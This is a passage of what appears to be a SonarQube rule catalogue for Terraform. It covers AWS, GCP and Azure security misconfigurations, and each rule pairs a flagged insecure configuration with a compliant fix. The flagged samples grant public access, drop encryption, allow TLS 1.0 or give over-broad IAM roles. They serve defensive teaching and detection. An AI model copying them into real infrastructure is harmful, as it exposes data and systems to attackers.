<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It’s recommended to implement the least privilege principle, i.e. to grant necessary permissions only to users for their required tasks. In the
context of resource-based policies, list the principals that need the access and grant to them only the required privileges.</p>
<h2>Sensitive Code Example</h2>
<p>This policy allows all users, including anonymous ones, to access an S3 bucket:</p>
<pre>
resource "aws_s3_bucket_policy" "mynoncompliantpolicy" {  # Sensitive
  bucket = aws_s3_bucket.mybucket.id
  policy = jsonencode({
    Id = "mynoncompliantpolicy"
    Version = "2012-10-17"
    Statement = [{
            Effect = "Allow"
            Principal = {
                AWS = "*"
            }
            Action = [
                "s3:PutObject"
            ]
            Resource: "${aws_s3_bucket.mybucket.arn}/*"
        }
    ]
  })
}
</pre>
<h2>Compliant Solution</h2>
<p>This policy allows only the authorized users:</p>
<pre>
resource "aws_s3_bucket_policy" "mycompliantpolicy" {
  bucket = aws_s3_bucket.mybucket.id
  policy = jsonencode({
    Id = "mycompliantpolicy"
    Version = "2012-10-17"
    Statement = [{
            Effect = "Allow"
            Principal = {
                AWS = [
                    "arn:aws:iam::${data.aws_caller_identity.current.account_id}:root"
                ]
            }
            Action = [
                "s3:PutObject"
            ]
            Resource = "${aws_s3_bucket.mybucket.arn}/*"
        }
    ]
  })
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://docs.aws.amazon.com/IAM/latest/UserGuide/best-practices.html#grant-least-privilege">AWS Documentation</a> - Grant least
  privilege </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/732">CWE-732 - Incorrect Permission Assignment for Critical Resource</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/284">CWE-284 - Improper Access Control</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=terraform:S6404">
              terraform:S6404
            </a>
          </td>
          <td>
            <details>
              <p>Granting public access to GCP resources may reduce an organization’s ability to protect itself against attacks or theft of its GCP resources.<br>
Security incidents associated with misuse of public access include disruption of critical functions, data theft, and additional costs due to resource
overload.</p>
<p>To be as prepared as possible in the event of a security incident, authentication combined with fine-grained permissions helps maintain the
principle of defense in depth and trace incidents back to the perpetrators.</p>
<p>GCP also provides the ability to grant access to a large group of people:</p>
<ul>
  <li> If public access is granted to all Google users, the impact of a data theft is the same as if public access is granted to all Internet users.
  </li>
  <li> If access is granted to a large Google group, the impact of a data theft is limited based on the size of the group. </li>
</ul>
<p>The only thing that changes in these cases is the ability to track user access in the event of an incident.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> This GCP resource is essential to the information system infrastructure. </li>
  <li> This GCP resource is essential to mission-critical functions. </li>
  <li> This GCP resource stores or processes sensitive data. </li>
  <li> Compliance policies require that access to this resource be authenticated. </li>
</ul>
<p>There is a risk if you answered yes to any of these questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Explicitly set access to this resource or function as private.</p>
<h2>Sensitive Code Example</h2>
<p>For IAM resources:</p>
<pre>
resource "google_cloudfunctions_function_iam_binding" "example" {
  members = [
    "allUsers",              # Sensitive
    "allAuthenticatedUsers", # Sensitive
  ]
}

resource "google_cloudfunctions_function_iam_member" "example" {
  member = "allAuthenticatedUsers" # Sensitive
}
</pre>
<p>For ACL resources:</p>
<pre>
resource "google_storage_bucket_access_control" "example" {
  entity = "allUsers" # Sensitive
}

resource "google_storage_bucket_acl" "example" {
  role_entity = [
    "READER:allUsers",              # Sensitive
    "READER:allAuthenticatedUsers", # Sensitive
  ]
}
</pre>
<p>For container clusters:</p>
<pre>
resource "google_container_cluster" "example" {
  private_cluster_config {
    enable_private_nodes    = false # Sensitive
    enable_private_endpoint = false # Sensitive
  }
}
</pre>
<h2>Compliant Solution</h2>
<p>For IAM resources:</p>
<pre>
resource "google_cloudfunctions_function_iam_binding" "example" {
  members = [
    "serviceAccount:${google_service_account.example.email}",
    "group:${var.example_group}"
  ]
}

resource "google_cloudfunctions_function_iam_member" "example" {
  member = "user:${var.example_user}" # Sensitive
}
</pre>
<p>For ACL resources:</p>
<pre>
resource "google_storage_bucket_access_control" "example" {
  entity = "user-${var.example_user]"
}

resource "google_storage_bucket_acl" "example" {
  role_entity = [
    "READER:user-name@example.com",
    "READER:group-admins@example.com"
  ]
}
</pre>
<p>For container clusters:</p>
<pre>
resource "google_container_cluster" "example" {
  private_cluster_config {
    enable_private_nodes    = true
    enable_private_endpoint = true
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/668">CWE-668 - Exposure of Resource to Wrong Sphere</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=terraform:S6327">
              terraform:S6327
            </a>
          </td>
          <td>
            <details>
              <p>Amazon Simple Notification Service (SNS) is a managed messaging service for application-to-application (A2A) and application-to-person (A2P)
communication. SNS topics allows publisher systems to fanout messages to a large number of subscriber systems. Amazon SNS allows to encrypt messages
when they are received. In the case that adversaries gain physical access to the storage medium or otherwise leak a message they are not able to
access the data.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The topic contains sensitive data that could cause harm when leaked. </li>
  <li> There are compliance requirements for the service to store data encrypted. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It’s recommended to encrypt SNS topics that contain sensitive information. Encryption and decryption are handled transparently by SNS, so no
further modifications to the application are necessary.</p>
<h2>Sensitive Code Example</h2>
<p>For <a href="https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/sns_topic">aws_sns_topic</a>:</p>
<pre>
resource "aws_sns_topic" "topic" {  # Sensitive, encryption disabled by default
  name = "sns-unencrypted"
}
</pre>
<h2>Compliant Solution</h2>
<p>For <a href="https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/sns_topic">aws_sns_topic</a>:</p>
<pre>
resource "aws_sns_topic" "topic" {
  name = "sns-encrypted"
  kms_master_key_id = aws_kms_key.enc_key.key_id
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://docs.aws.amazon.com/sns/latest/dg/sns-server-side-encryption.html">AWS Documentation</a> - Encryption at rest </li>
  <li> <a href="https://aws.amazon.com/blogs/compute/encrypting-messages-published-to-amazon-sns-with-aws-kms/">Encrypting messages published to
  Amazon SNS with AWS KMS</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/311">CWE-311 - Missing Encryption of Sensitive Data</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=terraform:S6403">
              terraform:S6403
            </a>
          </td>
          <td>
            <details>
              <p>By default, GCP SQL instances offer encryption in transit, with support for TLS, but insecure connections are still accepted. On an unsecured
network, such as a public network, the risk of traffic being intercepted is high. When the data isn’t encrypted, an attacker can intercept it and read
confidential information.</p>
<p>When creating a GCP SQL instance, a public IP address is automatically assigned to it and connections to the SQL instance from public networks can
be authorized.</p>
<p>TLS is automatically used when connecting to SQL instances through:</p>
<ul>
  <li> The <a href="https://cloud.google.com/sql/docs/mysql/connect-admin-proxy">Cloud SQL Auth proxy</a>. </li>
  <li> The <a href="https://cloud.google.com/sql/docs/mysql/connect-overview#languages">Java Socket Library</a>. </li>
  <li> The built-in mechanisms in the <a href="https://cloud.google.com/appengine/docs">App Engine</a> environments. </li>
</ul>
<h2>Ask Yourself Whether</h2>
<p>Connections are not already automatically encrypted by GCP (eg: SQL Auth proxy) and</p>
<ul>
  <li> Connections to the SQL instance are performed on untrusted networks. </li>
  <li> The data stored in the SQL instance is confidential. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It’s recommended to encrypt all connections to the SQL instance, whether using public or private IP addresses. However, since private networks can
be considered trusted, requiring TLS in this situation is usually a lower priority task.</p>
<h2>Sensitive Code Example</h2>
<pre>
resource "google_sql_database_instance" "example" { # Sensitive: tls is not required
  name             = "noncompliant-master-instance"
  database_version = "POSTGRES_11"
  region           = "us-central1"

  settings {
    tier = "db-f1-micro"
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
resource "google_sql_database_instance" "example" {
  name             = "compliant-master-instance"
  database_version = "POSTGRES_11"
  region           = "us-central1"

  settings {
    tier = "db-f1-micro"
    ip_configuration {
      require_ssl = true
      ipv4_enabled = true
    }
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/311">CWE-311 - Missing Encryption of Sensitive Data</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/79">CWE-319 - Cleartext Transmission of Sensitive Information</a> </li>
  <li> <a href="https://cloud.google.com/sql/docs/mysql/authorize-ssl">GCP Documentation</a> - Cloud SQL: Authorizing with SSL/TLS certificates </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=terraform:S4423">
              terraform:S4423
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability exposes encrypted data to a number of attacks whose goal is to recover the plaintext.</p>
<h2>Why is this an issue?</h2>
<p>Encryption algorithms are essential for protecting sensitive information and ensuring secure communications in a variety of domains. They are used
for several important reasons:</p>
<ul>
  <li> Confidentiality, privacy, and intellectual property protection </li>
  <li> Security during transmission or on storage devices </li>
  <li> Data integrity, general trust, and authentication </li>
</ul>
<p>When selecting encryption algorithms, tools, or combinations, you should also consider two things:</p>
<ol>
  <li> No encryption is unbreakable. </li>
  <li> The strength of an encryption algorithm is usually measured by the effort required to crack it within a reasonable time frame. </li>
</ol>
<p>For these reasons, as soon as cryptography is included in a project, it is important to choose encryption algorithms that are considered strong and
secure by the cryptography community.</p>
<p>To provide communication security over a network, SSL and TLS are generally used. However, it is important to note that the following protocols are
all considered weak by the cryptographic community, and are officially deprecated:</p>
<ul>
  <li> SSL versions 1.0, 2.0 and 3.0 </li>
  <li> TLS versions 1.0 and 1.1 </li>
</ul>
<p>When these unsecured protocols are used, it is best practice to expect a breach: that a user or organization with malicious intent will perform
mathematical attacks on this data after obtaining it by other means.</p>
<h3>What is the potential impact?</h3>
<p>After retrieving encrypted data and performing cryptographic attacks on it on a given timeframe, attackers can recover the plaintext that
encryption was supposed to protect.</p>
<p>Depending on the recovered data, the impact may vary.</p>
<p>Below are some real-world scenarios that illustrate the potential impact of an attacker exploiting the vulnerability.</p>
<h4>Additional attack surface</h4>
<p>By modifying the plaintext of the encrypted message, an attacker may be able to trigger additional vulnerabilities in the code. An attacker can
further exploit a system to obtain more information.<br> Encrypted values are often considered trustworthy because it would not be possible for a
third party to modify them under normal circumstances.</p>
<h4>Breach of confidentiality and privacy</h4>
<p>When encrypted data contains personal or sensitive information, its retrieval by an attacker can lead to privacy violations, identity theft,
financial loss, reputational damage, or unauthorized access to confidential systems.</p>
<p>In this scenario, the company, its employees, users, and partners could be seriously affected.</p>
<p>The impact is twofold, as data breaches and exposure of encrypted data can undermine trust in the organization, as customers, clients and
stakeholders may lose confidence in the organization’s ability to protect their sensitive data.</p>
<h4>Legal and compliance issues</h4>
<p>In many industries and locations, there are legal and compliance requirements to protect sensitive data. If encrypted data is compromised and the
plaintext can be recovered, companies face legal consequences, penalties, or violations of privacy laws.</p>
<h2>How to fix it in AWS API Gateway</h2>
<h3>Code examples</h3>
<p>These code samples illustrate how to fix this issue in both APIGateway and ApiGatewayV2.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
resource "aws_api_gateway_domain_name" "example" {
  domain_name = "api.example.com"
  security_policy = "TLS_1_0" # Noncompliant
}
</pre>
<p>The ApiGatewayV2 uses a weak TLS version by default:</p>
<pre data-diff-id="2" data-diff-type="noncompliant">
resource "aws_apigatewayv2_domain_name" "example" {
  domain_name = "api.example.com"
  domain_name_configuration {} # Noncompliant
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
resource "aws_api_gateway_domain_name" "example" {
  domain_name = "api.example.com"
  security_policy = "TLS_1_2"
}
</pre>
<pre data-diff-id="2" data-diff-type="compliant">
resource "aws_apigatewayv2_domain_name" "example" {
  domain_name = "api.example.com"
  domain_name_configuration {
    security_policy = "TLS_1_2"
  }
}
</pre>
<h3>How does this work?</h3>
<p>As a rule of thumb, by default you should use the cryptographic algorithms and mechanisms that are considered strong by the cryptographic
community.</p>
<p>The best choices at the moment are the following.</p>
<h4>Use TLS v1.2 or TLS v1.3</h4>
<p>Even though TLS V1.3 is available, using TLS v1.2 is still considered good and secure practice by the cryptography community.<br></p>
<p>The use of TLS v1.2 ensures compatibility with a wide range of platforms and enables seamless communication between different systems that do not
yet have TLS v1.3 support.</p>
<p>The only drawback depends on whether the framework used is outdated: its TLS v1.2 settings may enable older and insecure cipher suites that are
deprecated as insecure.</p>
<p>On the other hand, TLS v1.3 removes support for older and weaker cryptographic algorithms, eliminates known vulnerabilities from previous TLS
versions, and improves performance.</p>
<h2>Resources</h2>
<h3>Articles &amp; blog posts</h3>
<ul>
  <li> <a href="https://en.wikipedia.org/wiki/Padding_oracle_attack">Wikipedia, Padding Oracle Attack</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Chosen-ciphertext_attack">Wikipedia, Chosen-Ciphertext Attack</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Chosen-plaintext_attack">Wikipedia, Chosen-Plaintext Attack</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Semantic_security">Wikipedia, Semantically Secure Cryptosystems</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Optimal_asymmetric_encryption_padding">Wikipedia, OAEP</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Galois/Counter_Mode">Wikipedia, Galois/Counter Mode</a> </li>
</ul>
<h3>Standards</h3>
<ul>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/327">CWE-327 - Use of a Broken or Risky Cryptographic Algorithm</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=terraform:S6249">
              terraform:S6249
            </a>
          </td>
          <td>
            <details>
              <p>By default, S3 buckets can be accessed through HTTP and HTTPs protocols.</p>
<p>As HTTP is a clear-text protocol, it lacks the encryption of transported data, as well as the capability to build an authenticated connection. It
means that a malicious actor who is able to intercept traffic from the network can read, modify or corrupt the transported content.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The S3 bucket stores sensitive information. </li>
  <li> The infrastructure has to comply with AWS Foundational Security Best Practices standard. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It’s recommended to deny all HTTP requests:</p>
<ul>
  <li> for all objects (<code>*</code>) of the bucket </li>
  <li> for all principals (<code>*</code>) </li>
  <li> for all actions (<code>*</code>) </li>
</ul>
<h2>Sensitive Code Example</h2>
<p>No secure policy is attached to this bucket:</p>
<pre>
resource "aws_s3_bucket" "mynoncompliantbucket" { # Sensitive
  bucket = "mynoncompliantbucketname"
}
</pre>
<p>A policy is defined but forces only HTTPs communication for some users:</p>
<pre>
resource "aws_s3_bucket" "mynoncompliantbucket" { # Sensitive
  bucket = "mynoncompliantbucketname"
}

resource "aws_s3_bucket_policy" "mynoncompliantbucketpolicy" {
  bucket = "mynoncompliantbucketname"

  policy = jsonencode({
    Version = "2012-10-17"
    Id      = "mynoncompliantbucketpolicy"
    Statement = [
      {
        Sid       = "HTTPSOnly"
        Effect    = "Deny"
        Principal = [
          "arn:aws:iam::123456789123:root"
        ] # secondary location: only one principal is forced to use https
        Action    = "s3:*"
        Resource = [
          aws_s3_bucket.mynoncompliantbucketpolicy.arn,
          "${aws_s3_bucket.mynoncompliantbucketpolicy.arn}/*",
        ]
        Condition = {
          Bool = {
            "aws:SecureTransport" = "false"
          }
        }
      },
    ]
  })
}
</pre>
<h2>Compliant Solution</h2>
<p>A secure policy that denies all HTTP requests is used:</p>
<pre>
resource "aws_s3_bucket" "mycompliantbucket" {
  bucket = "mycompliantbucketname"
}

resource "aws_s3_bucket_policy" "mycompliantpolicy" {
  bucket = "mycompliantbucketname"

  policy = jsonencode({
    Version = "2012-10-17"
    Id      = "mycompliantpolicy"
    Statement = [
      {
        Sid       = "HTTPSOnly"
        Effect    = "Deny"
        Principal = "*"
        Action    = "s3:*"
        Resource = [
          aws_s3_bucket.mycompliantbucket.arn,
          "${aws_s3_bucket.mycompliantbucket.arn}/*",
        ]
        Condition = {
          Bool = {
            "aws:SecureTransport" = "false"
          }
        }
      },
    ]
  })
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://docs.aws.amazon.com/AmazonS3/latest/userguide/security-best-practices.html#transit">AWS documentation</a> - Enforce encryption
  of data in transit </li>
  <li> <a href="https://docs.aws.amazon.com/securityhub/latest/userguide/securityhub-standards-fsbp-controls.html#fsbp-s3-5">AWS Foundational Security
  Best Practices controls</a> - S3 buckets should require requests to use Secure Socket Layer </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/319">CWE-319 - Cleartext Transmission of Sensitive Information</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=terraform:S6406">
              terraform:S6406
            </a>
          </td>
          <td>
            <details>
              <p>Excessive granting of GCP IAM permissions can allow attackers to exploit an organization’s cloud resources with malicious intent.</p>
<p>To prevent improper creation or deletion of resources after an account is compromised, proactive measures include both following GCP Security
Insights and ensuring custom roles contain as few privileges as possible.</p>
<p>After gaining a foothold in the target infrastructure, sophisticated attacks typically consist of two major parts.<br> First, attackers must deploy
new resources to carry out their malicious intent. To guard against this, operations teams must control what unexpectedly appears in the
infrastructure, such as what is:</p>
<ul>
  <li> added </li>
  <li> written down </li>
  <li> updated </li>
  <li> started </li>
  <li> appended </li>
  <li> applied </li>
  <li> accessed. </li>
</ul>
<p>Once the malicious intent is executed, attackers must avoid detection at all costs.<br> To counter attackers' attempts to remove their
fingerprints, operations teams must control what unexpectedly disappears from the infrastructure, such as what is:</p>
<ul>
  <li> stopped </li>
  <li> disabled </li>
  <li> canceled </li>
  <li> deleted </li>
  <li> destroyed </li>
  <li> detached </li>
  <li> disconnected </li>
  <li> suspended </li>
  <li> rejected </li>
  <li> removed. </li>
</ul>
<p>For operations teams to be resilient in this scenario, their organization must apply both:</p>
<ul>
  <li> Detection security: log these actions to better detect malicious actions. </li>
  <li> Preventive security: review and limit granted permissions. </li>
</ul>
<p>This rule raises an issue when a custom role grants a number of sensitive permissions (read-write or destructive permission) that is greater than a
given parameter.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> This custom role will be mostly used for read-only purposes. </li>
  <li> Compliance policies require read-only access. </li>
</ul>
<p>There is a risk if you answered yes to any of these questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>To reduce the risks associated with this role after a compromise:</p>
<ul>
  <li> Reduce the list of permissions to grant only those that are actually needed. </li>
  <li> Favor read-only over read-write. </li>
</ul>
<h2>Sensitive Code Example</h2>
<p>This custom role grants more than 5 sensitive permissions:</p>
<pre>
resource "google_project_iam_custom_role" "example" {
  permissions = [ # Sensitive
    "resourcemanager.projects.create", # Sensitive permission
    "resourcemanager.projects.delete", # Sensitive permission
    "resourcemanager.projects.get",
    "resourcemanager.projects.list",
    "run.services.create", # Sensitive permission
    "run.services.delete", # Sensitive permission
    "run.services.get",
    "run.services.getIamPolicy",
    "run.services.setIamPolicy",  # Sensitive permission
    "run.services.list",
    "run.services.update",  # Sensitive permission
  ]
}
</pre>
<h2>Compliant Solution</h2>
<p>This custom role grants less than 5 sensitive permissions:</p>
<pre>
resource "google_project_iam_custom_role" "example" {
  permissions = [
    "resourcemanager.projects.get",
    "resourcemanager.projects.list",
    "run.services.create",
    "run.services.delete",
    "run.services.get",
    "run.services.getIamPolicy",
    "run.services.list",
    "run.services.update",
  ]
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://cloud.google.com/iam/docs/recommender-overview">GCP Docs</a> - Enforce least privilege with role recommendations </li>
  <li> <a href="https://cloud.google.com/iam/docs/manage-policy-insights">GCP Docs</a> - Security Insights </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/668">CWE-668 - Exposure of Resource to Wrong Sphere</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=terraform:S6329">
              terraform:S6329
            </a>
          </td>
          <td>
            <details>
              <p>Enabling public network access to cloud resources can affect an organization’s ability to protect its data or internal operations from data theft
or disruption.</p>
<p>Depending on the component, inbound access from the Internet can be enabled via:</p>
<ul>
  <li> a boolean value that explicitly allows access to the public network. </li>
  <li> the assignment of a public IP address. </li>
  <li> database firewall rules that allow public IP ranges. </li>
</ul>
<p>Deciding to allow public access may happen for various reasons such as for quick maintenance, time saving, or by accident.</p>
<p>This decision increases the likelihood of attacks on the organization, such as:</p>
<ul>
  <li> data breaches. </li>
  <li> intrusions into the infrastructure to permanently steal from it. </li>
  <li> and various malicious traffic, such as DDoS attacks. </li>
</ul>
<h2>Ask Yourself Whether</h2>
<p>This cloud resource:</p>
<ul>
  <li> should be publicly accessible to any Internet user. </li>
  <li> requires inbound traffic from the Internet to function properly. </li>
</ul>
<p>There is a risk if you answered no to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Avoid publishing cloud services on the Internet unless they are intended to be publicly accessible, such as customer portals or e-commerce
sites.</p>
<p>Use private networks (and associated private IP addresses) and VPC peering or other secure communication tunnels to communicate with other cloud
components.</p>
<p>The goal is to prevent the component from intercepting traffic coming in via the public IP address. If the cloud resource does not support the
absence of a public IP address, assign a public IP address to it, but do not create listeners for the public IP address.</p>
<h2>Sensitive Code Example</h2>
<p>For AWS:</p>
<pre>
resource "aws_instance" "example" {
  associate_public_ip_address = true # Sensitive
}
</pre>
<pre>
resource "aws_dms_replication_instance" "example" {
  publicly_accessible = true # Sensitive
}
</pre>
<p>For Azure:</p>
<pre>
resource "azurerm_postgresql_server" "example"  {
  public_network_access_enabled = true # Sensitive
}
</pre>
<pre>
resource "azurerm_postgresql_server" "example"  {
  public_network_access_enabled = true # Sensitive
}
</pre>
<pre>
resource "azurerm_kubernetes_cluster" "production" {
  api_server_authorized_ip_ranges = ["176.0.0.0/4"] # Sensitive
  default_node_pool {
    enable_node_public_ip = true # Sensitive
  }
}
</pre>
<p>For GCP:</p>
<pre>
resource "google_compute_instance" "example" {
  network_interface {
    network = "default"

    access_config {  # Sensitive
      # Ephemeral public IP
    }
  }
</pre>
<h2>Compliant Solution</h2>
<p>For AWS:</p>
<pre>
resource "aws_instance" "example" {
  associate_public_ip_address = false
}
</pre>
<pre>
resource "aws_dms_replication_instance" "example" {
  publicly_accessible          = false
}
</pre>
<p>For Azure:</p>
<pre>
resource "azurerm_postgresql_server" "example"  {
  public_network_access_enabled = false
}
</pre>
<pre>
resource "azurerm_kubernetes_cluster" "production" {
  api_server_authorized_ip_ranges = ["192.168.0.0/16"]
  default_node_pool {
    enable_node_public_ip = false
  }
}
</pre>
<p>For GCP:</p>
<pre>
resource "google_compute_instance" "example" {
  network_interface {
    network = google_compute_network.vpc_network_example.name
  }
}
</pre>
<p>Note that setting <code>network="default"</code> in the network interface block leads to other security problems such as removal of logging, Cloud
VPN/VPC network peering, and the addition of insecure firewall rules.<br> A safer alternative includes creating a specific VPC or subnetwork and
enforce security measures.</p>
<h2>See</h2>
<ul>
  <li> <a href="https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/using-instance-addressing.html">AWS Documentation</a> - Amazon EC2 instance IP
  addressing </li>
  <li> <a href="https://docs.aws.amazon.com/dms/latest/userguide/CHAP_ReplicationInstance.PublicPrivate.html">AWS Documentation</a> - Public and
  private replication instances </li>
  <li> <a href="https://docs.aws.amazon.com/vpc/latest/peering/what-is-vpc-peering.html">AWS Documentation</a> - VPC Peering </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/284">CWE-284 - Improper Access Control</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/668">CWE-668 - Exposure of Resource to Wrong Sphere</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=terraform:S6405">
              terraform:S6405
            </a>
          </td>
          <td>
            <details>
              <p>SSH keys stored and managed in a project’s metadata can be used to access GCP VM instances. By default, GCP automatically deploys project-level SSH
keys to VM instances.</p>
<p>Project-level SSH keys can lead to unauthorized access because:</p>
<ul>
  <li> Their use prevents fine-grained VM-level access control and makes it difficult to follow <a
  href="https://en.wikipedia.org/wiki/Principle_of_least_privilege">the principle of least privilege</a>. </li>
  <li> Unlike managed access control with <a href="https://cloud.google.com/compute/docs/instances/managing-instance-access">OS Login</a>, manual
  cryptographic key management is error-prone and requires careful attention. For example, if a user leaves a project, their SSH keys should be
  removed from the metadata to prevent unwanted access. </li>
  <li> If a project-level SSH key is compromised, all VM instances may be compromised. </li>
</ul>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> VM instances in a project have different security requirements. </li>
  <li> Many users with different profiles need access to the VM instances in that project. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Block project-level SSH keys by setting the <code>metadata.block-project-ssh-keys</code> argument to <code>true</code> </li>
  <li> Use <a href="https://cloud.google.com/compute/docs/instances/access-overview?_ga=2.125788746.-190863609.1642494607#oslogin">OSLogin</a> to
  benefit from managed access control. </li>
</ul>
<h2>Sensitive Code Example</h2>
<pre>
resource "google_compute_instance" "example" { # Sensitive, because metadata.block-project-ssh-keys is not set to true
  name         = "example"
  machine_type = "e2-micro"
  zone         = "us-central1-a"

  network_interface {
    network = "default"

    access_config {
    }
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
resource "google_compute_instance" "example" {
  name         = "example"
  machine_type = "e2-micro"
  zone         = "us-central1-a"

  metadata = {
    block-project-ssh-keys = true
  }

  network_interface {
    network = "default"

    access_config {
    }
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/266">CWE-266 - Incorrect Privilege Assignment</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/269">CWE-269 - Improper Privilege Management</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/272">CWE-272 - Least Privilege Violation</a> </li>
  <li> <a href="https://cloud.google.com/compute/docs/connect/restrict-ssh-keys#remove-metadata-key">GCP Documentation</a> - Restrict SSH keys from
  VMs </li>
  <li> <a href="https://cloud.google.com/compute/docs/instances/access-overview#risks">GCP Documentation</a> - Risks of manual key management </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=terraform:S6400">
              terraform:S6400
            </a>
          </td>
          <td>
            <details>
              <p>Granting highly privileged resource rights to users or groups can reduce an organization’s ability to protect against account or service theft. It
prevents proper segregation of duties and creates potentially critical attack vectors on affected resources.</p>
<p>If elevated access rights are abused or compromised, both the data that the affected resources work with and their access tracking are at risk.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> This GCP resource is essential to the information system infrastructure. </li>
  <li> This GCP resource is essential to mission-critical functions. </li>
  <li> Compliance policies require that administrative privileges for this resource be limited to a small group of individuals. </li>
</ul>
<p>There is a risk if you answered yes to any of these questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Grant IAM policies or members a less permissive role: In most cases, granting them read-only privileges is sufficient.</p>
<p>Separate tasks by creating multiple roles that do not use a full access role for day-to-day work.</p>
<p>If the predefined GCP roles do not include the specific permissions you need, create <a
href="https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/google_project_iam_custom_role">custom IAM roles</a>.</p>
<h2>Sensitive Code Example</h2>
<p>For an IAM policy setup:</p>
<pre>
data "google_iam_policy" "admin" {
  binding {
    role = "roles/run.admin" # Sensitive
    members = [
      "user:name@example.com",
    ]
  }
}

resource "google_cloud_run_service_iam_policy" "policy" {
  location = google_cloud_run_service.default.location
  project = google_cloud_run_service.default.project
  service = google_cloud_run_service.default.name
  policy_data = data.google_iam_policy.admin.policy_data
}
</pre>
<p>For an IAM policy binding:</p>
<pre>
resource "google_cloud_run_service_iam_binding" "example" {
  location = google_cloud_run_service.default.location
  project = google_cloud_run_service.default.project
  service = google_cloud_run_service.default.name
  role = "roles/run.admin" # Sensitive
  members = [
    "user:name@example.com",
  ]
}
</pre>
<p>For adding a member to a policy:</p>
<pre>
resource "google_cloud_run_service_iam_member" "example" {
  location = google_cloud_run_service.default.location
  project = google_cloud_run_service.default.project
  service = google_cloud_run_service.default.name
  role = "roles/run.admin" # Sensitive
  member = "user:name@example.com"
}
</pre>
<h2>Compliant Solution</h2>
<p>For an IAM policy setup:</p>
<pre>
data "google_iam_policy" "admin" {
  binding {
    role = "roles/viewer"
    members = [
      "user:name@example.com",
    ]
  }
}

resource "google_cloud_run_service_iam_policy" "example" {
  location = google_cloud_run_service.default.location
  project = google_cloud_run_service.default.project
  service = google_cloud_run_service.default.name
  policy_data = data.google_iam_policy.admin.policy_data
}
</pre>
<p>For an IAM policy binding:</p>
<pre>
resource "google_cloud_run_service_iam_binding" "example" {
  location = google_cloud_run_service.default.location
  project = google_cloud_run_service.default.project
  service = google_cloud_run_service.default.name
  role = "roles/viewer"
  members = [
    "user:name@example.com",
  ]
}
</pre>
<p>For adding a member to a policy:</p>
<pre>
resource "google_cloud_run_service_iam_member" "example" {
